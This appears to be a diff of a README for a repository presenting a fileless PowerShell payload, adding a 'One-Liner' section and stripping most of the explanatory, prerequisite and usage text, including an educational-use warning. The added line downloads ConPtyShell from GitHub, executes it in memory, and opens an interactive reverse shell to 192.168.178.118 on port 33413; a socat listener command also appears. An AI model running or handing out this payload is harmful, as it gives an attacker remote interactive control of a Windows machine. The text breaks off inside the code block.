@@ -13,6 +13,7 @@
 
 ## 📖 Table of Contents
 - [Overview](#-overview)
+- [The One-Liner](#-the-one-liner)
 - [How It Works](#-how-it-works)
 - [Prerequisites](#-prerequisites)
 - [Usage](#-usage)
@@ -22,30 +23,11 @@
 
 ## 🚀 Overview
 
-This one-liner downloads and executes **ConPtyShell** (`Invoke-ConPtyShell.ps1`) directly into memory from the official repository by `antonioCoco`. Unlike basic reverse shells, ConPtyShell creates a fully interactive Windows Pseudo Console (ConPTY), providing a rich terminal experience (supporting things like command history, proper resizing, and text formatting) over a netcat or custom listener.
+This repository features a quick fileless execution payload utilizing **ConPtyShell** (`Invoke-ConPtyShell.ps1`) by `antonioCoco`. Unlike basic reverse shells, ConPtyShell creates a fully interactive Windows Pseudo Console (ConPTY), providing a rich terminal experience (supporting command history, proper terminal resizing, and text formatting) over a netcat or custom listener.
 
 ---
 
-## ⚙️ How It Works
+## ⚡ The One-Liner
 
-1. **`IWR (Invoke-WebRequest)`**: Fetches the PowerShell script from GitHub using basic parsing.
-2. **`IEX (Invoke-Expression)`**: Executes the downloaded script directly in memory without writing it to disk (fileless execution).
-3. **`Invoke-ConPtyShell`**: Calls the function, pointing it to the target listener IP (`192.168.178.118`) and port (`33413`).
-
----
-
-## 📋 Prerequisites
-
-- Windows target machine with PowerShell enabled.
-- Network routing/connectivity to the listener IP.
-- A listener set up to catch the ConPTY connection.
-
----
-
-## 💻 Usage
-
-> **⚠️ Warning:** This command is intended strictly for educational purposes, authorized penetration testing, and CTF challenges.
-
-1. **Set up a listener** on your machine (note that ConPtyShell typically requires a specialized listener or a raw socket handler like `socat` or the accompanying C# listener to handle the terminal dimensions properly):
-   ```bash
-   socat file:`tty`,raw,echo=0 tcp-listen:33413
+```powershell
+IEX(IWR [https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1) -UseBasicParsing); Invoke-ConPtyShell 192.168.178.118 33413
